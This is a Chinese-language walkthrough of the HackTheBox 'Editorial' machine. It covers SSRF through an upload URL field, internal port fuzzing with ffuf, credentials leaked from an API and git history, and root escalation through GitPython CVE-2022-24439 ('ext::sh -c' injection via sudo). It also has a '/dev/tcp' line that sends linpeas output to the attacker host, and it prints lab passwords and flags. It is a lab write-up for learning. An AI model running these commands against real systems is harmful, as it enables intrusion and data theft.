nmap 結果
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

dirsearch 的結果
```
[22:51:28] Starting: 
[22:51:38] 200 -    3KB - /about                                            
[22:52:26] 200 -    7KB - /upload  
```

掃 subdomain 沒有找到東西
來看 /upload 頁面
![image](https://hackmd.io/_uploads/rkFNv8-Byg.png)

把請求都發過一遍後透過 burp 抓下來可以知道 Book information 都被 preview 控制 其他的被 sendbook info 控制
- preview 
上傳圖片會被修改檔名跟副檔名 所以不太能利用
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 72946
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryynSOq9ozAnlI8asf
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

------WebKitFormBoundaryynSOq9ozAnlI8asf
Content-Disposition: form-data; name="bookurl"

http://10.10.14.3:1234
------WebKitFormBoundaryynSOq9ozAnlI8asf
Content-Disposition: form-data; name="bookfile"; filename="Cat03.jpg"
Content-Type: image/jpeg

graph

------WebKitFormBoundaryynSOq9ozAnlI8asf--
```

但左邊可以上傳網址 先試看看能不能連線 成功後再試 SSRF 
![image](https://hackmd.io/_uploads/S1nUc8WSyg.png)

訪問 127.0.0.1 都是空的 去掃看看他的 port
做法 ： 
把 burp 的請求存成 txt 然後把 port 部分改成 fuzz
```java
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 302
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAQbSI1QUcvaMriAX
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive

------WebKitFormBoundaryAQbSI1QUcvaMriAX
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundaryAQbSI1QUcvaMriAX
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundaryAQbSI1QUcvaMriAX--
```
再來因為要掃 port 所以存一個 port 的 txt
```
seq 0 65535 > port.txt
```
最後就是搭配 ffuf 做掃描
```
ffuf -u "http://editorial.htb/upload-cover" -X POST -request script.txt -w port.txt -fs 61
```

在 5000 port 找到
```
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 61
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 283ms]
```

於是去訪問 5000 port 會拿到一個 api 檔案
![image](https://hackmd.io/_uploads/rJytgDZHJx.png)

用 curl 搭配 jq 比較好看
```
curl http://editorial.htb/static/uploads/8c678572-de07-439c-aaaf-50d9ecb15053 | jq . | tee 1234.txt
```

```javascript
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```
用一樣的方式檢查到 `/api/latest/metadata/messages/authors` 時得到一個有帳號密碼的回傳資料
```
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
  Your login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.
  Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.
  Best regards, Editorial Tiempo Arriba Team."                                                  
}
```

成功登入拿到 user flag `f02aa937a0b82d5aa452d65fca244868`
![image](https://hackmd.io/_uploads/S1KPm8zrJl.png)

在裡頭有個 `apps` 資料夾 進去有 .git 透過 scp 下載下來
```
scp -r dev@10.10.11.20:/home/dev/apps/ .
```

查看他的 log
```git=
git log

commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
    
    * This contains the base of this project.
    * Also we add a feature to enable to external authors send us their
       books and validate a future post in our editorial.
```

進去看 commit 會在 `1e84a036b2f33c59e2390730699a488c65643d28` 發現另一組帳號密碼 `prod` `080217_Producti0n_2023!@`
```git
git show 1e84a036b2f33c59e2390730699a488c65643d28

template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.
Your login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.
Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.
Best regards, " + api_editorial_name + " Team."
TODO: replace dev credentials when checks pass
```

成功 ssh
![image](https://hackmd.io/_uploads/SyKo5LfS1g.png)

用 linpeas.sh 檢查一下順便傳一份回本地
```bash=
目標主機
./linpeas.sh | tee 123.txt 
cat 123.txt > /dev/tcp/10.10.14.4/8888 0>&1

本地
nc -nvlp 888 > 123.txt
```

可以在裡面看到有一個特別的檔案 `/opt/internal_apps/clone_changes/clone_prod_change.py`
![image](https://hackmd.io/_uploads/Skwwttzrkx.png)

看他的 code
chatgpt 的解釋
![image](https://hackmd.io/_uploads/By8bRFzSkl.png)

```python=
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

上網找有沒有相關的漏洞 找到一個 gitpython 3.1.30 以下的 [CVE-2022-24439](https://github.com/gitpython-developers/GitPython/issues/1515)
![image](https://hackmd.io/_uploads/HkSLRFGSye.png)

檢查一下版本有沒有符合 `pip show gitpython`
![image](https://hackmd.io/_uploads/Bk3O0Kfrke.png)

是符合的 來試看看 輸入
```
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /tmp/pwn'

ls -l 確實有創建 /tmp/pwn 

這時可以用這個把 root.txt 複製出來 成功拿到 flag
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root.txt'
```

拿到 flag `6ae806f30bdb9b443d9d3d720241c5ee`
![image](https://hackmd.io/_uploads/rkvJd9MrJx.png)
